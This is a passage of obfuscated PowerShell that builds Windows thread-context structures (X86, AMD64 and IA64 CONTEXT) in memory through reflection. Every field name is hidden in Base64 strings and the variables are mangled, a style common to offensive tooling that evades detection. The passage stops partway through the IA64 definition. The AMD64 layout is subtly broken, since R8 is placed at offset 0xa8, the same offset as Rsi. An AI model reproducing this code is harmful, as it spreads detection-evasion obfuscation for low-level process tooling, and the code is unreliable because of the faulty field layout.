        ${_/==\/\___/\____/} = New-Object -TypeName System.Reflection.Emit.CustomAttributeBuilder -ArgumentList (${___/\_/\/\/=\_/=\}, ${__/\__/==\_/==\_/}, ${_/==\_/=\/=\_/\__}, @([Int32] 80))
        [void]${__/\__/\/===\__/\}.SetCustomAttribute(${_/==\/\___/\____/})
        [void]${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByADAATgBwAHgAUwB0AGEAdABlAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
        ${__/==\/\_/===\_/=} = ${__/\_/\___/\_____}.CreateType()
        ${_/==\/=\/\__/=\_/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
        ${__/\_/\___/\_____} = ${_/\/\/=\/\/\___/=}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WAA4ADYAXwBDAE8ATgBUAEUAWABUAA=='))), ${_/==\/=\/\__/=\_/}, [ValueType])
        [void]${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABlAHgAdABGAGwAYQBnAHMA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
        [void]${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RAByADAA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
        [void]${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RAByADEA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
        [void]${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RAByADIA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
        [void]${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RAByADMA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
        [void]${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RAByADYA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
        [void]${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RAByADcA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
        [void]${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAG8AYQB0AFMAYQB2AGUA'))), ${__/==\/\_/===\_/=}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
        [void]${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGcARwBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
        [void]${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGcARgBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
        [void]${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGcARQBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
        [void]${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGcARABzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
        [void]${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBkAGkA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
        [void]${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBzAGkA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
        [void]${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBiAHgA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
        [void]${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBkAHgA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
        [void]${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBjAHgA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
        [void]${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBhAHgA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
        [void]${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBiAHAA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
        [void]${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBpAHAA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
        [void]${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGcAQwBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
        [void]${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBGAGwAYQBnAHMA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
        [void]${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBzAHAA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
        [void]${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGcAUwBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
        ${/==\___/\___/\/\/} = ${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHQAZQBuAGQAZQBkAFIAZQBnAGkAcwB0AGUAcgBzAA=='))), [Byte[]], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
        ${_/==\/\___/\____/} = New-Object -TypeName System.Reflection.Emit.CustomAttributeBuilder -ArgumentList (${___/\_/\/\/=\_/=\}, ${__/\__/==\_/==\_/}, ${_/==\_/=\/=\_/\__}, @([Int32] 512))
        [void]${/==\___/\___/\/\/}.SetCustomAttribute(${_/==\/\___/\____/})
        ${Global:_/\_/\___/\/=\___} = ${__/\_/\___/\_____}.CreateType()
        ${_/==\/=\/\__/=\_/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAEUAeABwAGwAaQBjAGkAdABMAGEAeQBvAHUAdAAsACAAUwBlAGEAbABlAGQALAAgAEIAZQBmAG8AcgBlAEYAaQBlAGwAZABJAG4AaQB0AA==')))
        ${__/\_/\___/\_____} = ${_/\/\/=\/\/\___/=}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBNAEQANgA0AF8AQwBPAE4AVABFAFgAVAA='))), ${_/==\/=\/\__/=\_/}, [ValueType])
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAAxAEgAbwBtAGUA'))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x0)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAAyAEgAbwBtAGUA'))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x8)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAAzAEgAbwBtAGUA'))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x10)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAA0AEgAbwBtAGUA'))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x18)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAA1AEgAbwBtAGUA'))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x20)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAA2AEgAbwBtAGUA'))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x28)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABlAHgAdABGAGwAYQBnAHMA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x30)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQB4AEMAcwByAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x34)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGcAQwBzAA=='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x38)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGcARABzAA=='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x3a)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGcARQBzAA=='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x3c)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGcARgBzAA=='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x3e)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGcARwBzAA=='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x40)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGcAUwBzAA=='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x42)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBGAGwAYQBnAHMA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x44)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RAByADAA'))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x48)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RAByADEA'))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x50)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RAByADIA'))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x58)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RAByADMA'))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x60)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RAByADYA'))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x68)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RAByADcA'))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x70)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHgA'))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x78)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBjAHgA'))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x80)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBkAHgA'))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x88)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBiAHgA'))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x90)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBzAHAA'))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x98)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBiAHAA'))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0xa0)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBzAGkA'))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0xa8)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBkAGkA'))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0xb0)
        (${__/\_/\___/\_____}.DefineField('R8', [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0xa8)
        (${__/\_/\___/\_____}.DefineField('R9', [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0xc0)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgAxADAA'))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0xc8)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgAxADEA'))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0xd0)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgAxADIA'))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0xd8)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgAxADMA'))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0xe0)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgAxADQA'))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0xe8)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgAxADUA'))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0xf0)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBpAHAA'))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0xf8)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQAUwBhAHYAZQA='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x100)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABlAGcAYQBjAHkA'))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x120)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WABtAG0AMAA='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x1a0)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WABtAG0AMQA='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x1b0)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WABtAG0AMgA='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x1c0)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WABtAG0AMwA='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x1d0)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WABtAG0ANAA='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x1e0)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WABtAG0ANQA='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x1f0)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WABtAG0ANgA='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x200)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WABtAG0ANwA='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x210)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WABtAG0AOAA='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x220)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WABtAG0AOQA='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x230)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WABtAG0AMQAwAA=='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x240)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WABtAG0AMQAxAA=='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x250)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WABtAG0AMQAyAA=='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x260)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WABtAG0AMQAzAA=='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x270)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WABtAG0AMQA0AA=='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x280)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WABtAG0AMQA1AA=='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x290)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBlAGMAdABvAHIAUgBlAGcAaQBzAHQAZQByAA=='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x300)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBlAGMAdABvAHIAQwBvAG4AdAByAG8AbAA='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x4a0)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGIAdQBnAEMAbwBuAHQAcgBvAGwA'))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x4a8)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABCAHIAYQBuAGMAaABUAG8AUgBpAHAA'))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x4b0)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABCAHIAYQBuAGMAaABGAHIAbwBtAFIAaQBwAA=='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x4b8)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABFAHgAYwBlAHAAdABpAG8AbgBUAG8AUgBpAHAA'))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x4c0)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABFAHgAYwBlAHAAdABpAG8AbgBGAHIAbwBtAFIAaQBwAA=='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x4c8)
        ${Global:_/\/\/\/\/\_/=\__} = ${__/\_/\___/\_____}.CreateType()
        ${_/==\/=\/\__/=\_/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAEUAeABwAGwAaQBjAGkAdABMAGEAeQBvAHUAdAAsACAAUwBlAGEAbABlAGQALAAgAEIAZQBmAG8AcgBlAEYAaQBlAGwAZABJAG4AaQB0AA==')))
        ${__/\_/\___/\_____} = ${_/\/\/=\/\/\___/=}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBADYANABfAEMATwBOAFQARQBYAFQA'))), ${_/==\/=\/\__/=\_/}, [ValueType])
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABlAHgAdABGAGwAYQBnAHMA'))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x0)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABiAEkAMAA='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x010)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABiAEkAMQA='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x018)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABiAEkAMgA='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x020)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABiAEkAMwA='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x028)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABiAEkANAA='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x030)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABiAEkANQA='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x038)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABiAEkANgA='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x040)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABiAEkANwA='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x048)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABiAEQAMAA='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x050)
